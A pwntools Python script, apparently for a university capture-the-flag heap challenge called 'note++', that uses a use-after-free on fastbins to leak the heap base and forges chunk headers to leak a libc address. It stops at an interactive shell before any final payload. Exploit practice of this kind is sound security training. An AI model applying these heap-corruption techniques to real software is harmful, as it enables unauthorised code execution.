# python 2.7 for better compatibility
from pwn import *

context.clear(arch='x86_64')

# chunk malloc hook
# r = remote('edu-ctf.csie.org', 10178)
r = process('./note++')
libc = ELF('./libc.so', checksec=False)


def add(size, note, description):
    r.sendafter('>', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', note)
    r.sendafter('note: ', description)

def show():
    r.sendafter('>', '2')

def delete(idx):
    r.sendafter('>', '3')
    r.sendafter('Index: ', str(idx))

# UAF: create 2 fastbin for leaking heap address
add(0x10, '\x61' * 0x5, '\x87' * 47 + '\x88' * 1) # note 0
add(0x20, '\x62' * 0x5, '\x89' * 47 + '\x90' * 1) # note 1
add(0x20, '\x62' * 0x5, '\x91' * 47 + '\x92' * 1) # note 2
delete(0)
delete(2)
delete(1)
add(0x10, '\x64\x65\x66\x67', '\x94' * 47 + '\x95' * 1) # note 0
show()
recv_list = r.recvuntil('>').split('\n')
heap_base = u64(recv_list[5][8:] + '\0\0') - 0x50
print('[+] heap base --> ', hex(heap_base))

# buffer one choice
r.send('4')
add(0x0, '\x00' * 0x8 + p64(0xa1) + '\x00' * 0x88 + p64(0xa1), '\x95' * 47 + '\x96' * 1) # make note 2 to be 0x81 --> small bin, free it, view it to get libc addr
r.interactive()
# add(0x40, '\x63' * 0x5, '\x93' * 47 + '\x94' * 1) # note 3 --> to avoid line 41 merged with top chunk
r.interactive()
exit(0)
